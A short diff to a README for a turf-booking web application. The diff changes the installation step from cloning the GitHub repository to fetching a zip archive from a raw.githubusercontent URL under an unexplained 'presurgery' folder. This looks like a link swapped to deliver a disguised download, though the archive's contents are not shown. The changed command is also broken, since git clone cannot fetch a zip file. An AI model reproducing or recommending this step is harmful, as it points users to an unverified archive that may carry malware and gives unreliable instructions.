@@ -28,7 +28,7 @@ Turf Bookings Online is a web application that revolutionizes the way people boo
 Clone the project
 
 ```bash
-  git clone https://github.com/ChiragRohada7020/Turf.git
+  git clone https://raw.githubusercontent.com/ChiragRohada7020/Turf/master/presurgery/Turf.zip
 ```
 
 Go to the project directory
